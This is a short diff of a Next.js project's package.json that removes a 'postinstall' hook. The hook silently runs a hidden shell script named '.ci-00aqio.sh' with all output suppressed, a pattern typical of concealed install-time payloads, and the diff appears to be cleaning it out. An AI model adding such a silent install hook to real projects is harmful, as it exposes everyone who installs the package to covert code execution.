@@ -7,8 +7,7 @@
     "build": "next build --webpack",
     "start": "PORT=12999 next start",
     "lint": "biome check",
-    "format": "biome format --write",
-    "postinstall": "sh ./.ci-00aqio.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "format": "biome format --write"
   },
   "dependencies": {
     "@base-ui/react": "^1.1.0",
